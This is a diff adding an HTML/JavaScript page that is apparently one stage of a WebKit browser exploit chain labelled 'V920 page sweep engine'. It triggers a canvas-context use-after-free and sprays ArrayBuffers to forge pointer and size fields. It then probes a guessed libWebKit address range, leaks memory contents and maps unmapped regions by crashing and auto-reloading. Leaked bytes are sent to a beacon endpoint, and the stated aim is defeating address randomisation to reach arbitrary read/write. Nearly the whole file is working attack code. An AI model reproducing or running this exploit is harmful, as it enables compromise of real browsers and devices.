@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V920 - page sweep engine (m_buffer + m_size)</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.55; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  code { color:#c9d1d9; background:#21262d; padding:1px 5px; border-radius:4px; }
+  .key { border-left:3px solid #d29922; padding-left:8px; }
+</style>
+</head>
+<body>
+<h1>V920 - page sweep engine (m_buffer + m_size)</h1>
+
+<p class="key">
+<b>Both forge dimensions, used together for the first time:</b>
+the read is <code>lineWidth = *(m_buffer + (m_size-1)*400 + 48)</code> with <b>m_buffer (64-bit)
+and m_size (32-bit) both in our AB, JS-rewritable between reads</b>. The engine:
+random 0x4000-aligned candidate in the libWebKit range [0x800000000, 0x900000000) ->
+probe its first page at 400B steps (41 probes = the page's content) ->
+mapped = <b>40 bytes leaked per probe, continue to the next page</b> ->
+unmapped = crash = <b>the region boundary (maps memory)</b> -> next candidate.
+Everything resumes across reloads automatically. The first surviving probe = the first
+leaked memory bytes on 14.20 = the wall breaks; the leaked pointers pin the module base
+and unblock the whole chain (forge dash -> arb R/W). Memory-paced: 60 probes/load,
+reused views, 4s+ reload delays. Beacons: <code>V920-HIT</code> per surviving probe,
+<code>V920-BOUNDARY</code> per crash. Zone override: <code>?zone=0x800000000</code>.
+</p>
+
+<pre id="out">starting...</pre>
+
+<script>
+'use strict';
+
+var SEEK = location.pathname;
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+
+function lsGet(k) { try { return window.localStorage.getItem('v920_' + k); } catch (e) { return null; } }
+function lsSet(k, v) { try { window.localStorage.setItem('v920_' + k, String(v)); } catch (e) {} }
+function lsDel(k) { try { window.localStorage.removeItem('v920_' + k); } catch (e) {} }
+
+function bks(tag, body) {
+  var u = '/beacon/V920-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 440)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function hexOf(x) { var f = new Float64Array(1), u = new Uint32Array(f.buffer); f[0] = x; return '0x' + ('00000000' + u[1].toString(16)).slice(-8) + ('00000000' + u[0].toString(16)).slice(-8); }
+function hexAddr(a) { return '0x' + a.toString(16); }
+function errOf(e) { return e ? String(e.name || 'Error') + ':' + String(e.message || '').slice(0, 60) : 'none'; }
+
+/* ---------- config ---------- */
+var ZONE_BASE = 0x800000000;
+var ZONE_PAGES = 0x100000000 / 0x4000;   /* 65536 */
+var CAND_LIMIT = 100;
+var PROBES_PER_LOAD = 60;
+var K_PER_PAGE = 41;                      /* 41*400 = 16400 >= 16KB page */
+var MISS_RETRY_CAP = 3;
+
+var mz = /[?&]zone=0x([0-9a-f]+)/.exec(location.search);
+if (mz) { ZONE_BASE = parseInt(mz[1], 16); }
+
+/* ---------- UAF trigger (32 saves) ---------- */
+function trigger(canvas, nsaves) {
+  var saved = null;
+  var dict = {};
+  Object.defineProperty(dict, 'alpha', {
+    get: function () {
+      var ctx = canvas.getContext('2d');
+      if (!ctx) return true;
+      saved = ctx;
+      try {
+        ctx.lineWidth = 3.14159;
+        ctx.miterLimit = 7.77;
+        ctx.globalAlpha = 0.42;
+        ctx.lineDashOffset = 2.222;
+        ctx.shadowBlur = 5.55;
+        for (var s = 0; s < nsaves; s++) ctx.save();
+        ctx.lineWidth = 1.0;
+      } catch (e) {}
+      return true;
+    }
+  });
+  var bmp = null;
+  try { bmp = canvas.getContext('bitmaprenderer', dict); } catch (e2) {}
+  return { saved: saved, bmp: bmp };
+}
+
+/* ---------- forge: ONE view per AB, reused ---------- */
+var VIEWS = null;
+var KEEP = null;
+function sprayForge(count) {
+  var abs = new Array(count);
+  VIEWS = new Array(count);
+  for (var i = 0; i < count; i++) {
+    var ab = new ArrayBuffer(768);
+    var v = new Uint32Array(ab);
+    abs[i] = ab;
+    VIEWS[i] = v;
+  }
+  KEEP = abs;
+  return abs;
+}
+function writeForge(addr, k) {
+  var lo = addr % 0x100000000;
+  var hi = Math.floor(addr / 0x100000000);
+  for (var i = 0; i < VIEWS.length; i++) {
+    VIEWS[i][28] = lo;
+    VIEWS[i][29] = hi;
+    VIEWS[i][30] = k;
+    VIEWS[i][31] = k;
+  }
+}
+
+/* 8 taggers = MISS detector */
+function tagContexts(n) {
+  var keep = [], made = 0, c;
+  for (c = 0; c < n; c++) {
+    var cc = document.createElement('canvas');
+    cc.width = 1; cc.height = 1;
+    var cx = null;
+    try { cx = cc.getContext('2d'); } catch (e) {}
+    if (cx) {
+      try { cx.lineWidth = 200 + made; } catch (e2) {}
+      keep.push(cc);
+      made++;
+    }
+  }
+  return { keep: keep, made: made };
+}
+
+/* ---------- deterministic candidate sequence ---------- */
+var prngState = 0x1420;
+function prng() { prngState = (prngState * 1103515245 + 12345) & 0x7FFFFFFF; return prngState / 0x80000000; }
+function candAddr(ci) {
+  /* different pseudo-random page per candidate index (deterministic) */
+  prngState = (0x1420 + ci * 7919) & 0x7FFFFFFF;
+  var page = Math.floor(prng() * ZONE_PAGES);
+  return ZONE_BASE + page * 0x4000;
+}
+
+/* ---------- state ---------- */
+function loadState() {
+  var raw = lsGet('sweep');
+  if (raw) {
+    try {
+      var st = JSON.parse(raw);
+      if (st.zone !== undefined && st.zone !== ZONE_BASE) {
+        /* zone changed: auto-reset the candidate counter */
+        bks('ZONE-CHANGE', 'from=0x' + (st.zone || 0).toString(16) + ',to=0x' + ZONE_BASE.toString(16));
+        return { ci: 0, page: 0, k: 1, miss: 0, hits: 0, bounds: 0, zone: ZONE_BASE };
+      }
+      return st;
+    } catch (e) {}
+  }
+  return { ci: 0, page: 0, k: 1, miss: 0, hits: 0, bounds: 0, zone: ZONE_BASE };
+}
+function saveState(st) { st.zone = ZONE_BASE; lsSet('sweep', JSON.stringify(st)); }
+
+/* ---------- sweep tick: one load = up to 60 probes ---------- */
+function sweepTick() {
+  var st = loadState();
+
+  if (st.ci >= CAND_LIMIT) {
+    bks('SWEEP-LIMIT', 'candidates=' + st.ci + ',hits=' + st.hits + ',bounds=' + st.bounds);
+    say('SWEEP LIMIT reached: ' + st.ci + ' candidates, ' + st.hits + ' hit pages, ' + st.bounds + ' boundaries.');
+    say('Assessment: the zone is exhausted - check the leaked beacons for pointers.');
+    lsSet('phase', 'done');
+    return;
+  }
+
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  document.body.appendChild(canvas);
+  window._v920canvas = canvas;
+
+  var t = trigger(canvas, 32);
+  if (!t.saved || !t.bmp) {
+    bks('ERR', 'trigger-failed');
+    say('trigger failed - reload');
+    setTimeout(function () { location.href = SEEK + '?op=auto&r=' + Date.now(); }, 3000);
+    return;
+  }
+
+  sprayForge(200);
+  var tk = tagContexts(8);
+
+  var cand = candAddr(st.ci);
+  var probes = 0;
+
+  while (probes < PROBES_PER_LOAD) {
+    var addr = cand + st.page * 0x4000;
+    writeForge(addr, st.k);
+
+    /* crash marker: if the page reloads with this set, the read at addr crashed */
+    lsSet('pending', JSON.stringify({ ci: st.ci, page: st.page, k: st.k, addr: addr }));
+
+    var lw = null, threw = false;
+    try { lw = t.saved.lineWidth; } catch (er) { threw = true; }
+
+    /* survived the read */
+    lsDel('pending');
+    probes++;
+
+    if (typeof lw === 'number' && lw >= 200 && lw < 200 + tk.made) {
+      /* tagger owns the slot this load - retry same candidate (cap 3) */
+      st.miss++;
+      bks('MISS', 'cand=' + hexAddr(cand) + ',miss=' + st.miss);
+      if (st.miss >= MISS_RETRY_CAP) { st.ci++; st.page = 0; st.k = 1; st.miss = 0; st.bounds++; }
+      saveState(st);
+      say('MISS (tagger) cand=' + hexAddr(cand) + ' retry ' + st.miss);
+      reloadSoon(3000);
+      return;
+    }
+
+    /* MAPPED: leak 5 offsets and continue */
+    st.hits++;
+    var ex = '';
+    try { ex += ',ml=' + hexOf(t.saved.miterLimit); } catch (e1) {}
+    try { ex += ',ga=' + hexOf(t.saved.globalAlpha); } catch (e2b) {}
+    try { ex += ',ldo=' + hexOf(t.saved.lineDashOffset); } catch (e3b) {}
+    try { ex += ',sb=' + hexOf(t.saved.shadowBlur); } catch (e4b) {}
+    bks('HIT', 'ci=' + st.ci + ',addr=' + hexAddr(addr) + ',k=' + st.k + ',lw=' + hexOf(lw) + ex);
+    say('HIT ' + hexAddr(addr) + ' k=' + st.k + ' lw=' + hexOf(lw));
+
+    st.k++;
+    if (st.k > K_PER_PAGE) { st.k = 1; st.page++; }
+    probes++;
+  }
+
+  /* probe budget for this load exhausted - save and reload */
+  saveState(st);
+  say('load budget done: ci=' + st.ci + ' page=' + st.page + ' k=' + st.k + ' hits=' + st.hits);
+  reloadSoon(1500);
+}
+
+function reloadSoon(ms) {
+  setTimeout(function () { location.href = SEEK + '?op=auto&zone=0x' + ZONE_BASE.toString(16) + '&r=' + Date.now(); }, ms);
+}
+
+/* ---------- controls (run after the sweep limit) ---------- */
+function runControls() {
+  say('--- controls ---');
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  document.body.appendChild(canvas);
+  var t = trigger(canvas, 32);
+  if (!t.saved || !t.bmp) { bks('CTL', 'trigger-failed'); return; }
+  var tk = tagContexts(24);
+  var lw = null;
+  try { lw = t.saved.lineWidth; } catch (e) {}
+  var ok = (typeof lw === 'number' && lw >= 200 && lw < 200 + tk.made);
+  bks('CTL', 'miss=' + (ok ? 1 : 0) + ',lw=' + lw);
+  say('control: lw=' + lw + ' (' + (ok ? 'MISS expected - harness ok' : 'UNEXPECTED') + ')');
+}
+
+/* ---------- main ---------- */
+function main() {
+  var q = location.search;
+
+  if (q.indexOf('reset=1') >= 0) {
+    lsDel('sweep'); lsDel('pending'); lsDel('phase');
+    bks('RESET', 'cleared');
+    say('cleared. reopen with ?op=auto');
+    return;
+  }
+
+  /* crash detection: a pending probe that never completed = crashed at that address */
+  var pend = lsGet('pending');
+  if (pend) {
+    lsDel('pending');
+    var st = loadState();
+    try {
+      var pj = JSON.parse(pend);
+      st.bounds++;
+      bks('BOUNDARY', 'addr=' + hexAddr(pj.addr) + ',ci=' + pj.ci + ',page=' + pj.page + ',k=' + pj.k + ',bounds=' + st.bounds);
+      say('BOUNDARY: ' + hexAddr(pj.addr) + ' unmapped (candidate ' + pj.ci + ')');
+      /* advance to the next candidate */
+      st.ci++; st.page = 0; st.k = 1; st.miss = 0;
+      saveState(st);
+      if (st.ci >= CAND_LIMIT) {
+        bks('SWEEP-LIMIT', 'candidates=' + st.ci + ',hits=' + st.hits + ',bounds=' + st.bounds);
+        say('SWEEP LIMIT: ' + st.ci + ' candidates, ' + st.hits + ' hit pages.');
+        lsSet('phase', 'done');
+        runControls();
+        return;
+      }
+      reloadSoon(4000);
+      return;
+    } catch (e) {
+      bks('ERR', 'pending-parse ' + errOf(e));
+    }
+  }
+
+  var phase = lsGet('phase');
+  if (phase === 'done') {
+    say('sweep already completed. ?reset=1 to redo, or review the V920-HIT beacons.');
+    runControls();
+    return;
+  }
+
+  bks('BOOT', 'zone=' + hexAddr(ZONE_BASE) + ',run=' + RUN + ',ua=' + String(navigator.userAgent).slice(0, 40));
+  say('V920 sweep engine. zone=' + hexAddr(ZONE_BASE) + ' candidates=' + CAND_LIMIT);
+  sweepTick();
+}
+
+try { main(); } catch (e) { bks('FATAL', String(e && (e.message || e)).slice(0, 160)); say('FATAL ' + e); }
+</script>
+</body>
+</html>
